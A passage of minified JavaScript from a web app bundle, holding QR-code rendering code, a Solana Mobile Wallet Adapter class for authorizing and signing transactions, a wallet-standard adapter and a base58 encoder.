r=zp.getSymbolTotalCodewords(e),i=J0.getTotalCodewordsCount(e,t),s=r-i,o=J0.getBlocksCount(e,t),a=r%o,l=o-a,u=Math.floor(r/o),h=Math.floor(s/o),f=h+1,p=u-h,w=new n6(p);let x=0;const k=new Array(o),I=new Array(o);let A=0;const b=new Uint8Array(n.buffer);for(let L=0;L<o;L++){const N=L<l?h:f;k[L]=b.slice(x,x+N),I[L]=w.encode(k[L]),x+=N,A=Math.max(A,N)}const E=new Uint8Array(r);let O=0,W,q;for(W=0;W<A;W++)for(q=0;q<o;q++)W<k[q].length&&(E[O++]=k[q][W]);for(W=0;W<p;W++)for(q=0;q<o;q++)E[O++]=I[q][W];return E}function f6(n,e,t,r){let i;if(Array.isArray(n))i=Em.fromArray(n);else if(typeof n=="string"){let u=e;if(!u){const h=Em.rawSplit(n);u=Nd.getBestVersionForData(h,t)}i=Em.fromString(n,u||40)}else throw new Error("Invalid data");const s=Nd.getBestVersionForData(i,t);if(!s)throw new Error("The amount of data is too big to be stored in a QR Code");if(!e)e=s;else if(e<s)throw new Error(`
The chosen QR Code version cannot contain this amount of data.
Minimum version required to store current data is: `+s+`.
`);const o=u6(e,t,i),a=zp.getSymbolSize(e),l=new XB(a);return s6(l,e),o6(l),a6(l,e),Im(l,t,0),e>=7&&l6(l,e),c6(l,o),isNaN(r)&&(r=Z0.getBestMask(l,Im.bind(null,l,t))),Z0.applyMask(r,l),Im(l,t,r),{modules:l,version:e,errorCorrectionLevel:t,maskPattern:r,segments:i}}Lx.create=function(e,t){if(typeof e>"u"||e==="")throw new Error("No input text");let r=_m.M,i,s;return typeof t<"u"&&(r=_m.from(t.errorCorrectionLevel,_m.M),i=Nd.from(t.version),s=Z0.from(t.maskPattern),t.toSJISFunc&&zp.setToSJISFunction(t.toSJISFunc)),f6(e,i,r,s)};var Kx={},vv={};(function(n){function e(t){if(typeof t=="number"&&(t=t.toString()),typeof t!="string")throw new Error("Color should be defined as hex string");let r=t.slice().replace("#","").split("");if(r.length<3||r.length===5||r.length>8)throw new Error("Invalid hex color: "+t);(r.length===3||r.length===4)&&(r=Array.prototype.concat.apply([],r.map(function(s){return[s,s]}))),r.length===6&&r.push("F","F");const i=parseInt(r.join(""),16);return{r:i>>24&255,g:i>>16&255,b:i>>8&255,a:i&255,hex:"#"+r.slice(0,6).join("")}}n.getOptions=function(r){r||(r={}),r.color||(r.color={});const i=typeof r.margin>"u"||r.margin===null||r.margin<0?4:r.margin,s=r.width&&r.width>=21?r.width:void 0,o=r.scale||4;return{width:s,scale:s?4:o,margin:i,color:{dark:e(r.color.dark||"#000000ff"),light:e(r.color.light||"#ffffffff")},type:r.type,rendererOpts:r.rendererOpts||{}}},n.getScale=function(r,i){return i.width&&i.width>=r+i.margin*2?i.width/(r+i.margin*2):i.scale},n.getImageWidth=function(r,i){const s=n.getScale(r,i);return Math.floor((r+i.margin*2)*s)},n.qrToImageData=function(r,i,s){const o=i.modules.size,a=i.modules.data,l=n.getScale(o,s),u=Math.floor((o+s.margin*2)*l),h=s.margin*l,f=[s.color.light,s.color.dark];for(let p=0;p<u;p++)for(let w=0;w<u;w++){let x=(p*u+w)*4,k=s.color.light;if(p>=h&&w>=h&&p<u-h&&w<u-h){const I=Math.floor((p-h)/l),A=Math.floor((w-h)/l);k=f[a[I*o+A]?1:0]}r[x++]=k.r,r[x++]=k.g,r[x++]=k.b,r[x]=k.a}}})(vv);(function(n){const e=vv;function t(i,s,o){i.clearRect(0,0,s.width,s.height),s.style||(s.style={}),s.height=o,s.width=o,s.style.height=o+"px",s.style.width=o+"px"}function r(){try{return document.createElement("canvas")}catch{throw new Error("You need to specify a canvas element")}}n.render=function(s,o,a){let l=a,u=o;typeof l>"u"&&(!o||!o.getContext)&&(l=o,o=void 0),o||(u=r()),l=e.getOptions(l);const h=e.getImageWidth(s.modules.size,l),f=u.getContext("2d"),p=f.createImageData(h,h);return e.qrToImageData(p.data,s,l),t(f,u,h),f.putImageData(p,0,0),u},n.renderToDataURL=function(s,o,a){let l=a;typeof l>"u"&&(!o||!o.getContext)&&(l=o,o=void 0),l||(l={});const u=n.render(s,o,l),h=l.type||"image/png",f=l.rendererOpts||{};return u.toDataURL(h,f.quality)}})(Kx);var Gx={};const d6=vv;function qE(n,e){const t=n.a/255,r=e+'="'+n.hex+'"';return t<1?r+" "+e+'-opacity="'+t.toFixed(2).slice(1)+'"':r}function Sm(n,e,t){let r=n+e;return typeof t<"u"&&(r+=" "+t),r}function p6(n,e,t){let r="",i=0,s=!1,o=0;for(let a=0;a<n.length;a++){const l=Math.floor(a%e),u=Math.floor(a/e);!l&&!s&&(s=!0),n[a]?(o++,a>0&&l>0&&n[a-1]||(r+=s?Sm("M",l+t,.5+u+t):Sm("m",i,0),i=0,s=!1),l+1<e&&n[a+1]||(r+=Sm("h",o),o=0)):i++}return r}Gx.render=function(e,t,r){const i=d6.getOptions(t),s=e.modules.size,o=e.modules.data,a=s+i.margin*2,l=i.color.light.a?"<path "+qE(i.color.light,"fill")+' d="M0 0h'+a+"v"+a+'H0z"/>':"",u="<path "+qE(i.color.dark,"stroke")+' d="'+p6(o,s,i.margin)+'"/>',h='viewBox="0 0 '+a+" "+a+'"',p='<svg xmlns="http://www.w3.org/2000/svg" '+(i.width?'width="'+i.width+'" height="'+i.width+'" ':"")+h+' shape-rendering="crispEdges">'+l+u+`</svg>
`;return typeof r=="function"&&r(null,p),p};const g6=RB,X0=Lx,Qx=Kx,m6=Gx;function _v(n,e,t,r,i){const s=[].slice.call(arguments,1),o=s.length,a=typeof s[o-1]=="function";if(!a&&!g6())throw new Error("Callback required as last argument");if(a){if(o<2)throw new Error("Too few arguments provided");o===2?(i=t,t=e,e=r=void 0):o===3&&(e.getContext&&typeof i>"u"?(i=r,r=void 0):(i=r,r=t,t=e,e=void 0))}else{if(o<1)throw new Error("Too few arguments provided");return o===1?(t=e,e=r=void 0):o===2&&!e.getContext&&(r=t,t=e,e=void 0),new Promise(function(l,u){try{const h=X0.create(t,r);l(n(h,e,r))}catch(h){u(h)}})}try{const l=X0.create(t,r);i(null,n(l,e,r))}catch(l){i(l)}}X0.create;_v.bind(null,Qx.render);_v.bind(null,Qx.renderToDataURL);_v.bind(null,function(n,e,t){return m6.render(n,t)});function tt(n,e,t,r){function i(s){return s instanceof t?s:new t(function(o){o(s)})}return new(t||(t=Promise))(function(s,o){function a(h){try{u(r.next(h))}catch(f){o(f)}}function l(h){try{u(r.throw(h))}catch(f){o(f)}}function u(h){h.done?s(h.value):i(h.value).then(a,l)}u((r=r.apply(n,e||[])).next())})}function Pf(n){return new Uint8Array(window.atob(n).split("").map(e=>e.charCodeAt(0)))}function y6(){return typeof window<"u"&&window.isSecureContext&&typeof document<"u"&&/android/i.test(navigator.userAgent)}const hu="Mobile Wallet Adapter",w6=64;function v6(n){const e=Pf(n);return new Se(e)}function KE(n){return"version"in n}function _6(n){switch(n){case"mainnet-beta":return"solana:mainnet";case"testnet":return"solana:testnet";case"devnet":return"solana:devnet"}}class E6 extends B3{constructor(e){var t;super(),this.supportedTransactionVersions=new Set(["legacy",0]),this.name=hu,this.url="https://solanamobile.com/wallets",this.icon="data:image/svg+xml;base64,PHN2ZyBmaWxsPSJub25lIiBoZWlnaHQ9IjI4IiB3aWR0aD0iMjgiIHZpZXdCb3g9Ii0zIDAgMjggMjgiIHhtbG5zPSJodHRwOi8vd3d3LnczLm9yZy8yMDAwL3N2ZyI+PGcgZmlsbD0iI0RDQjhGRiI+PHBhdGggZD0iTTE3LjQgMTcuNEgxNXYyLjRoMi40di0yLjRabTEuMi05LjZoLTIuNHYyLjRoMi40VjcuOFoiLz48cGF0aCBkPSJNMjEuNiAzVjBoLTIuNHYzaC0zLjZWMGgtMi40djNoLTIuNHY2LjZINC41YTIuMSAyLjEgMCAxIDEgMC00LjJoMi43VjNINC41QTQuNSA0LjUgMCAwIDAgMCA3LjVWMjRoMjEuNnYtNi42aC0yLjR2NC4ySDIuNFYxMS41Yy41LjMgMS4yLjQgMS44LjVoNy41QTYuNiA2LjYgMCAwIDAgMjQgOVYzaC0yLjRabTAgNS43YTQuMiA0LjIgMCAxIDEtOC40IDBWNS40aDguNHYzLjNaIi8+PC9nPjwvc3ZnPg==",this._connecting=!1,this._connectionGeneration=0,this._readyState=y6()?Ve.Loadable:Ve.Unsupported,this._authorizationResultCache=e.authorizationResultCache,this._addressSelector=e.addressSelector,this._appIdentity=e.appIdentity,this._chain=(t=e.chain)!==null&&t!==void 0?t:_6(e.cluster),this._hostAuthority=e.remoteHostAuthority,this._onWalletNotFound=e.onWalletNotFound,this._readyState!==Ve.Unsupported&&this._authorizationResultCache.get().then(r=>{r&&this.declareWalletAsInstalled()})}get publicKey(){if(this._publicKey==null&&this._selectedAddress!=null)try{this._publicKey=v6(this._selectedAddress)}catch(e){throw new Vl(e instanceof Error&&(e==null?void 0:e.message)||"Unknown error",e)}return this._publicKey?this._publicKey:null}get connected(){return!!this._authorizationResult}get connecting(){return this._connecting}get readyState(){return this._readyState}declareWalletAsInstalled(){this._readyState!==Ve.Installed&&this.emit("readyStateChange",this._readyState=Ve.Installed)}runWithGuard(e){return tt(this,void 0,void 0,function*(){try{return yield e()}catch(t){throw this.emit("error",t),t}})}autoConnect_DO_NOT_USE_OR_YOU_WILL_BE_FIRED(){return tt(this,void 0,void 0,function*(){return yield this.autoConnect()})}autoConnect(){return tt(this,void 0,void 0,function*(){if(!(this.connecting||this.connected))return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){if(this._readyState!==Ve.Installed&&this._readyState!==Ve.Loadable)throw new so;this._connecting=!0;try{const e=yield this._authorizationResultCache.get();e&&this.handleAuthorizationResult(e)}catch(e){throw new qs(e instanceof Error&&e.message||"Unknown error",e)}finally{this._connecting=!1}}))})}connect(){return tt(this,void 0,void 0,function*(){if(!(this.connecting||this.connected))return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){if(this._readyState!==Ve.Installed&&this._readyState!==Ve.Loadable)throw new so;this._connecting=!0;try{yield this.performAuthorization()}catch(e){throw new qs(e instanceof Error&&e.message||"Unknown error",e)}finally{this._connecting=!1}}))})}performAuthorization(e){return tt(this,void 0,void 0,function*(){try{const t=yield this._authorizationResultCache.get();return t?(this.handleAuthorizationResult(t),t):yield this.transact(r=>tt(this,void 0,void 0,function*(){const i=yield r.authorize({chain:this._chain,identity:this._appIdentity,sign_in_payload:e});return Promise.all([this._authorizationResultCache.set(i),this.handleAuthorizationResult(i)]),i}))}catch(t){throw new qs(t instanceof Error&&t.message||"Unknown error",t)}})}handleAuthorizationResult(e){var t;return tt(this,void 0,void 0,function*(){const r=this._authorizationResult==null||((t=this._authorizationResult)===null||t===void 0?void 0:t.accounts.length)!==e.accounts.length||this._authorizationResult.accounts.some((i,s)=>i.address!==e.accounts[s].address);if(this._authorizationResult=e,this.declareWalletAsInstalled(),r){const i=yield this._addressSelector.select(e.accounts.map(({address:s})=>s));i!==this._selectedAddress&&(this._selectedAddress=i,delete this._publicKey,this.emit("connect",this.publicKey))}})}performReauthorization(e,t){return tt(this,void 0,void 0,function*(){try{const r=yield e.authorize({auth_token:t,identity:this._appIdentity});Promise.all([this._authorizationResultCache.set(r),this.handleAuthorizationResult(r)])}catch(r){throw this.disconnect(),new Op(r instanceof Error&&(r==null?void 0:r.message)||"Unknown error",r)}})}disconnect(){return tt(this,void 0,void 0,function*(){this._authorizationResultCache.clear(),this._connecting=!1,this._connectionGeneration++,delete this._authorizationResult,delete this._publicKey,delete this._selectedAddress,this.emit("disconnect")})}transact(e){var t;return tt(this,void 0,void 0,function*(){const r=(t=this._authorizationResult)===null||t===void 0?void 0:t.wallet_uri_base,i=r?{baseUri:r}:void 0,s=this._hostAuthority?{remoteHostAuthority:this._hostAuthority}:void 0,o=this._connectionGeneration;try{return yield CB(e,Object.assign(Object.assign({},i),s))}catch(a){throw this._connectionGeneration!==o&&(yield new Promise(()=>{})),a instanceof Error&&a.name==="SolanaMobileWalletAdapterError"&&a.code==="ERROR_WALLET_NOT_FOUND"&&(yield this._onWalletNotFound(this)),a}})}assertIsAuthorized(){if(!this._authorizationResult||!this._selectedAddress)throw new sn;return{authToken:this._authorizationResult.auth_token,selectedAddress:this._selectedAddress}}performSignTransactions(e){return tt(this,void 0,void 0,function*(){const{authToken:t}=this.assertIsAuthorized();try{return yield this.transact(r=>tt(this,void 0,void 0,function*(){return yield this.performReauthorization(r,t),yield r.signTransactions({transactions:e})}))}catch(r){throw new ai(r==null?void 0:r.message,r)}})}sendTransaction(e,t,r){return tt(this,void 0,void 0,function*(){return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){const{authToken:i}=this.assertIsAuthorized(),s=r==null?void 0:r.minContextSlot;try{return yield this.transact(o=>tt(this,void 0,void 0,function*(){function a(){let f;switch(t.commitment){case"confirmed":case"finalized":case"processed":f=t.commitment;break;default:f="finalized"}let p;switch(r==null?void 0:r.preflightCommitment){case"confirmed":case"finalized":case"processed":p=r.preflightCommitment;break;case void 0:p=f;break;default:p="finalized"}return(p==="finalized"?2:p==="confirmed"?1:0)<(f==="finalized"?2:f==="confirmed"?1:0)?p:f}const[l,u,h]=yield Promise.all([o.getCapabilities(),this.performReauthorization(o,i),KE(e)?null:(()=>tt(this,void 0,void 0,function*(){var f;if(e.feePayer||(e.feePayer=(f=this.publicKey)!==null&&f!==void 0?f:void 0),e.recentBlockhash==null){const{blockhash:p}=yield t.getLatestBlockhash({commitment:a()});e.recentBlockhash=p}}))()]);if(l.supports_sign_and_send_transactions)return(yield o.signAndSendTransactions({minContextSlot:s,transactions:[e]}))[0];{const[f]=yield o.signTransactions({transactions:[e]});if(KE(f))return yield t.sendTransaction(f);{const p=f.serialize();return yield t.sendRawTransaction(p,Object.assign(Object.assign({},r),{preflightCommitment:a()}))}}}))}catch(o){throw new es(o==null?void 0:o.message,o)}}))})}signTransaction(e){return tt(this,void 0,void 0,function*(){return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){const[t]=yield this.performSignTransactions([e]);return t}))})}signAllTransactions(e){return tt(this,void 0,void 0,function*(){return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){return yield this.performSignTransactions(e)}))})}signMessage(e){return tt(this,void 0,void 0,function*(){return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){const{authToken:t,selectedAddress:r}=this.assertIsAuthorized();try{return yield this.transact(i=>tt(this,void 0,void 0,function*(){yield this.performReauthorization(i,t);const[s]=yield i.signMessages({addresses:[r],payloads:[e]});return s.slice(-w6)}))}catch(i){throw new Bp(i==null?void 0:i.message,i)}}))})}signIn(e){return tt(this,void 0,void 0,function*(){return yield this.runWithGuard(()=>tt(this,void 0,void 0,function*(){var t,r;if(this._readyState!==Ve.Installed&&this._readyState!==Ve.Loadable)throw new so;this._connecting=!0;try{const i=yield this.performAuthorization(Object.assign(Object.assign({},e),{domain:(t=e==null?void 0:e.domain)!==null&&t!==void 0?t:window.location.host}));if(!i.sign_in_result)throw new Error("Sign in failed, no sign in result returned by wallet");const s=i.sign_in_result.address;return{account:Object.assign(Object.assign({},(r=i.accounts.find(a=>a.address==s))!==null&&r!==void 0?r:{address:s}),{publicKey:Pf(s)}),signedMessage:Pf(i.sign_in_result.signed_message),signature:Pf(i.sign_in_result.signature)}}catch(i){throw new qs(i instanceof Error&&i.message||"Unknown error",i)}finally{this._connecting=!1}}))})}}function I6(){return{select(n){return tt(this,void 0,void 0,function*(){return n[0]})}}}const Tm="SolanaMobileWalletAdapterDefaultAuthorizationCache";function S6(){let n;try{n=window.localStorage}catch{}return{clear(){return tt(this,void 0,void 0,function*(){if(n)try{n.removeItem(Tm)}catch{}})},get(){return tt(this,void 0,void 0,function*(){if(n)try{return JSON.parse(n.getItem(Tm))||void 0}catch{}})},set(e){return tt(this,void 0,void 0,function*(){if(n)try{n.setItem(Tm,JSON.stringify(e))}catch{}})}}}function T6(n){return tt(this,void 0,void 0,function*(){typeof window<"u"&&window.location.assign(n.url)})}function A6(){return T6}var b6=globalThis&&globalThis.__classPrivateFieldGet||function(n,e,t,r){if(t==="a"&&!r)throw new TypeError("Private accessor was defined without a getter");if(typeof e=="function"?n!==e||!r:!e.has(n))throw new TypeError("Cannot read private member from an object whose class did not declare it");return t==="m"?r:t==="a"?r.call(n):r?r.value:e.get(n)},x6=globalThis&&globalThis.__classPrivateFieldSet||function(n,e,t,r,i){if(r==="m")throw new TypeError("Private method is not writable");if(r==="a"&&!i)throw new TypeError("Private accessor was defined without a setter");if(typeof e=="function"?n!==e||!i:!e.has(n))throw new TypeError("Cannot write private member to an object whose class did not declare it");return r==="a"?i.call(n,t):i?i.value=t:e.set(n,t),t},Lf;function k6(n){const e=({register:t})=>t(n);try{window.dispatchEvent(new C6(e))}catch(t){console.error(`wallet-standard:register-wallet event could not be dispatched
`,t)}try{window.addEventListener("wallet-standard:app-ready",({detail:t})=>e(t))}catch(t){console.error(`wallet-standard:app-ready event listener could not be added
`,t)}}class C6 extends Event{get detail(){return b6(this,Lf,"f")}get type(){return"wallet-standard:register-wallet"}constructor(e){super("wallet-standard:register-wallet",{bubbles:!1,cancelable:!1,composed:!1}),Lf.set(this,void 0),x6(this,Lf,e,"f")}preventDefault(){throw new Error("preventDefault cannot be called")}stopImmediatePropagation(){throw new Error("stopImmediatePropagation cannot be called")}stopPropagation(){throw new Error("stopPropagation cannot be called")}}Lf=new WeakMap;globalThis&&globalThis.__classPrivateFieldGet;globalThis&&globalThis.__classPrivateFieldSet;function R6(n,e){if(n===e)return!0;const t=n.length;if(t!==e.length)return!1;for(let r=0;r<t;r++)if(n[r]!==e[r])return!1;return!0}function M6(n){if(n.length>=255)throw new TypeError("Alphabet too long");const e=new Uint8Array(256);for(let u=0;u<e.length;u++)e[u]=255;for(let u=0;u<n.length;u++){const h=n.charAt(u),f=h.charCodeAt(0);if(e[f]!==255)throw new TypeError(h+" is ambiguous");e[f]=u}const t=n.length,r=n.charAt(0),i=Math.log(t)/Math.log(256),s=Math.log(256)/Math.log(t);function o(u){if(u instanceof Uint8Array||(ArrayBuffer.isView(u)?u=new Uint8Array(u.buffer,u.byteOffset,u.byteLength):Array.isArray(u)&&(u=Uint8Array.from(u))),!(u instanceof Uint8Array))throw new TypeError("Expected Uint8Array");if(u.length===0)return"";let h=0,f=0,p=0;const w=u.length;for(;p!==w&&u[p]===0;)p++,h++;const x=(w-p)*s+1>>>0,k=new Uint8Array(x);for(;p!==w;){let b=u[p],E=0;for(let O=x-1;(b!==0||E<f)&&O!==-1;O--,E++)b+=256*k[O]>>>0,k[O]=b%t>>>0,b=b/t>>>0;if(b!==0)throw new Error("Non-zero carry");f=E,p++}let I=x-f;for(;I!==x&&k[I]===0;)I++;let A=r.repeat(h);for(;I<x;++I)A+=n.charAt(k[I]);return A}function a(u){if(typeof u!="string")throw new TypeError("Expected String");if(u.length===0)return new Uint8Array;let h=0,f=0,p=0;for(;u[h]===r;)f++,h++;const w=(u.length-h)*i+1>>>0,x=new Uint8Array(w);for(;h<u.length;){const b=u.charCodeAt(h);if(b>255)return;let E=e[b];if(E===255)return;let O=0;for(let W=w-1;(E!==0||O<p)&&W!==-1;W--,O++)E+=t*x[W]>>>0,x[W]=E%256>>>0,E=E/256>>>0;if(E!==0)throw new Error("Non-zero carry");p=O,h++}let k=w-p;for(;k!==w&&x[k]===0;)k++;const I=new Uint8Array(f+(w-k));let A=f;for(;k!==w;)I[A++]=x[k++];return I}function l(u){const h=a(u);if(h)return h;throw new Error("Non-base"+t+" character")}return{encode:o,decodeUnsafe:a,decode:l}}var N6="123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";const Yx=M6(N6);var Ee=globalThis&&globalThis.__classPrivateFieldGet||function(n,e,t,r){if(t==="a"&&!r)throw new TypeError("Private accessor was defined without a getter");if(typeof e=="function"?n!==e||!r:!e.has(n))throw new TypeError("Cannot read private member from an object whose class did not declare it");return t==="m"?r:t==="a"?r.call(n):r?r.value:e.get(n)},cn=globalThis&&globalThis.__classPrivateFieldSet||function(n,e,t,r,i){if(r==="m")throw new TypeError("Private method is not writable");if(r==="a"&&!i)throw new TypeError("Private accessor was defined without a setter");if(typeof e=="function"?n!==e||!i:!e.has(n))throw new TypeError("Cannot write private member to an object whose class did not declare it");return r==="a"?i.call(n,t):i?i.value=t:e.set(n,t),t},Ln,fr,Qo,Yo,jo,Gc,Pd,nt,Ld,ey,Df,ty,fu,ny,GE,QE,YE,ZE;class P6 extends Sx{get name(){return Ee(this,nt,"f").name}get url(){return"https://github.com/solana-labs/wallet-standard"}get icon(){return Ee(this,nt,"f").icon}get readyState(){return Ee(this,Ld,"f")}get publicKey(){return Ee(this,Qo,"f")}get connecting(){return Ee(this,Yo,"f")}get supportedTransactionVersions(){return Ee(this,Pd,"f")}get wallet(){return Ee(this,nt,"f")}get standard(){return!0}constructor({wallet:e}){super(),Ln.add(this),fr.set(this,void 0),Qo.set(this,void 0),Yo.set(this,void 0),jo.set(this,void 0),Gc.set(this,void 0),Pd.set(this,void 0),nt.set(this,void 0),Ld.set(this,typeof window>"u"||typeof document>"u"?Ve.Unsupported:Ve.Installed),ny.set(this,t=>{if("accounts"in t){const r=Ee(this,nt,"f").accounts[0];Ee(this,fr,"f")&&!Ee(this,jo,"f")&&r!==Ee(this,fr,"f")&&(r?Ee(this,Ln,"m",Df).call(this,r):(this.emit("error",new Op),Ee(this,Ln,"m",ty).call(this)))}"features"in t&&Ee(this,Ln,"m",fu).call(this)}),cn(this,nt,e,"f"),cn(this,fr,null,"f"),cn(this,Qo,null,"f"),cn(this,Yo,!1,"f"),cn(this,jo,!1,"f"),cn(this,Gc,Ee(this,nt,"f").features[gv].on("change",Ee(this,ny,"f")),"f"),Ee(this,Ln,"m",fu).call(this)}destroy(){cn(this,fr,null,"f"),cn(this,Qo,null,"f"),cn(this,Yo,!1,"f"),cn(this,jo,!1,"f");const e=Ee(this,Gc,"f");e&&(cn(this,Gc,null,"f"),e())}async autoConnect(){return Ee(this,Ln,"m",ey).call(this,{silent:!0})}async connect(){return Ee(this,Ln,"m",ey).call(this)}async disconnect(){if(K0 in Ee(this,nt,"f").features)try{cn(this,jo,!0,"f"),await Ee(this,nt,"f").features[K0].disconnect()}catch(e){this.emit("error",new fv(e==null?void 0:e.message,e))}finally{cn(this,jo,!1,"f")}Ee(this,Ln,"m",ty).call(this)}async sendTransaction(e,t,r={}){try{const i=Ee(this,fr,"f");if(!i)throw new sn;let s;if(Zi in Ee(this,nt,"f").features)if(i.features.includes(Zi))s=Zi;else if(In in Ee(this,nt,"f").features&&i.features.includes(In))s=In;else throw new Ko;else if(In in Ee(this,nt,"f").features){if(!i.features.includes(In))throw new Ko;s=In}else throw new hl;const o=W3(t.rpcEndpoint);if(!i.chains.includes(o))throw new es;try{const{signers:a,...l}=r;let u;if(ts(e)?(a!=null&&a.length&&e.sign(a),u=e.serialize()):(e=await this.prepareTransaction(e,t,l),a!=null&&a.length&&e.partialSign(...a),u=new Uint8Array(e.serialize({requireAllSignatures:!1,verifySignatures:!1}))),s===Zi){const[h]=await Ee(this,nt,"f").features[Zi].signAndSendTransaction({account:i,chain:o,transaction:u,options:{preflightCommitment:dm(l.preflightCommitment||t.commitment),skipPreflight:l.skipPreflight,maxRetries:l.maxRetries,minContextSlot:l.minContextSlot}});return Yx.encode(h.signature)}else{const[h]=await Ee(this,nt,"f").features[In].signTransaction({account:i,chain:o,transaction:u,options:{preflightCommitment:dm(l.preflightCommitment||t.commitment),minContextSlot:l.minContextSlot}});return await t.sendRawTransaction(h.signedTransaction,{...l,preflightCommitment:dm(l.preflightCommitment||t.commitment)})}}catch(a){throw a instanceof kn?a:new es(a==null?void 0:a.message,a)}}catch(i){throw this.emit("error",i),i}}}fr=new WeakMap,Qo=new WeakMap,Yo=new WeakMap,jo=new WeakMap,Gc=new WeakMap,Pd=new WeakMap,nt=new WeakMap,Ld=new WeakMap,ny=new WeakMap,Ln=new WeakSet,ey=async function(e){try{if(this.connected||this.connecting)return;if(Ee(this,Ld,"f")!==Ve.Installed)throw new so;if(cn(this,Yo,!0,"f"),!Ee(this,nt,"f").accounts.length)try{await Ee(this,nt,"f").features[pv].connect(e)}catch(r){throw new qs(r==null?void 0:r.message,r)}const t=Ee(this,nt,"f").accounts[0];if(!t)throw new Ko;Ee(this,Ln,"m",Df).call(this,t)}catch(t){throw this.emit("error",t),t}finally{cn(this,Yo,!1,"f")}},Df=function(e){let t;try{t=new Se(e.address)}catch(r){throw new Vl(r==null?void 0:r.message,r)}cn(this,fr,e,"f"),cn(this,Qo,t,"f"),Ee(this,Ln,"m",fu).call(this),this.emit("connect",t)},ty=function(){cn(this,fr,null,"f"),cn(this,Qo,null,"f"),Ee(this,Ln,"m",fu).call(this),this.emit("disconnect")},fu=function(){var t,r;const e=Zi in Ee(this,nt,"f").features?Ee(this,nt,"f").features[Zi].supportedTransactionVersions:Ee(this,nt,"f").features[In].supportedTransactionVersions;cn(this,Pd,R6(e,["legacy"])?null:new Set(e),"f"),In in Ee(this,nt,"f").features&&((t=Ee(this,fr,"f"))!=null&&t.features.includes(In))?(this.signTransaction=Ee(this,Ln,"m",GE),this.signAllTransactions=Ee(this,Ln,"m",QE)):(delete this.signTransaction,delete this.signAllTransactions),qa in Ee(this,nt,"f").features&&((r=Ee(this,fr,"f"))!=null&&r.features.includes(qa))?this.signMessage=Ee(this,Ln,"m",YE):delete this.signMessage,fm in Ee(this,nt,"f").features?this.signIn=Ee(this,Ln,"m",ZE):delete this.signIn},GE=async function(e){try{const t=Ee(this,fr,"f");if(!t)throw new sn;if(!(In in Ee(this,nt,"f").features))throw new hl;if(!t.features.includes(In))throw new Ko;try{const i=(await Ee(this,nt,"f").features[In].signTransaction({account:t,transaction:ts(e)?e.serialize():new Uint8Array(e.serialize({requireAllSignatures:!1,verifySignatures:!1}))}))[0].signedTransaction;return ts(e)?Wu.deserialize(i):mr.from(i)}catch(r){throw r instanceof kn?r:new ai(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}},QE=async function(e){try{const t=Ee(this,fr,"f");if(!t)throw new sn;if(!(In in Ee(this,nt,"f").features))throw new hl;if(!t.features.includes(In))throw new Ko;try{const r=await Ee(this,nt,"f").features[In].signTransaction(...e.map(i=>({account:t,transaction:ts(i)?i.serialize():new Uint8Array(i.serialize({requireAllSignatures:!1,verifySignatures:!1}))})));return e.map((i,s)=>{const o=r[s].signedTransaction;return ts(i)?Wu.deserialize(o):mr.from(o)})}catch(r){throw new ai(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}},YE=async function(e){try{const t=Ee(this,fr,"f");if(!t)throw new sn;if(!(qa in Ee(this,nt,"f").features))throw new hl;if(!t.features.includes(qa))throw new Ko;try{return(await Ee(this,nt,"f").features[qa].signMessage({account:t,message:e}))[0].signature}catch(r){throw new Bp(r==null?void 0:r.message,r)}}catch(t){throw this.emit("error",t),t}},ZE=async function(e={}){try{if(!(fm in Ee(this,nt,"f").features))throw new hl;let t;try{[t]=await Ee(this,nt,"f").features[fm].signIn(e)}catch(r){throw new BE(r==null?void 0:r.message,r)}if(!t)throw new BE;return Ee(this,Ln,"m",Df).call(this,t.account),t}catch(t){throw this.emit("error",t),t}};const L6=U3;var D6=globalThis&&globalThis.__classPrivateFieldGet||function(n,e,t,r){if(t==="a"&&!r)throw new TypeError("Private accessor was defined without a getter");if(typeof e=="function"?n!==e||!r:!e.has(n))throw new TypeError("Cannot read private member from an object whose class did not declare it");return t==="m"?r:t==="a"?r.call(n):r?r.value:e.get(n)},O6=globalThis&&globalThis.__classPrivateFieldSet||function(n,e,t,r,i){if(r==="m")throw new TypeError("Private method is not writable");if(r==="a"&&!i)throw new TypeError("Private accessor was defined without a setter");if(typeof e=="function"?n!==e||!i:!e.has(n))throw new TypeError("Cannot write private member to an object whose class did not declare it");return r==="a"?i.call(n,t):i?i.value=t:e.set(n,t),t},Of;let Tr;const Wp=new Set;function B6(n){du=void 0,Wp.add(n)}function U6(n){du=void 0,Wp.delete(n)}const fl={};function j6(){if(Tr||(Tr=Object.freeze({register:JE,get:V6,on:F6}),typeof window>"u"))return Tr;const n=Object.freeze({register:JE});try{window.addEventListener("wallet-standard:register-wallet",({detail:e})=>e(n))}catch(e){console.error(`wallet-standard:register-wallet event listener could not be added
`,e)}try{window.dispatchEvent(new z6(n))}catch(e){console.error(`wallet-standard:app-ready event could not be dispatched
`,e)}return Tr}function JE(...n){var e;return n=n.filter(t=>!Wp.has(t)),n.length?(n.forEach(t=>B6(t)),(e=fl.register)==null||e.forEach(t=>ry(()=>t(...n))),function(){var r;n.forEach(i=>U6(i)),(r=fl.unregister)==null||r.forEach(i=>ry(()=>i(...n)))}):()=>{}}let du;function V6(){return du||(du=[...Wp]),du}function F6(n,e){var t;return(t=fl[n])!=null&&t.push(e)||(fl[n]=[e]),function(){var i;fl[n]=(i=fl[n])==null?void 0:i.filter(s=>e!==s)}}function ry(n){try{n()}catch(e){console.error(e)}}class z6 extends Event{get detail(){return D6(this,Of,"f")}get type(){return"wallet-standard:app-ready"}constructor(e){super("wallet-standard:app-ready",{bubbles:!1,cancelable:!1,composed:!1}),Of.set(this,void 0),O6(this,Of,e,"f")}preventDefault(){throw new Error("preventDefault cannot be called")}stopImmediatePropagation(){throw new Error("stopImmediatePropagation cannot be called")}stopPropagation(){throw new Error("stopPropagation cannot be called")}}Of=new WeakMap;function W6(){if(Tr||(Tr=j6(),typeof window>"u"))return Tr;const n=window.navigator.wallets||[];if(!Array.isArray(n))return console.error("window.navigator.wallets is not an 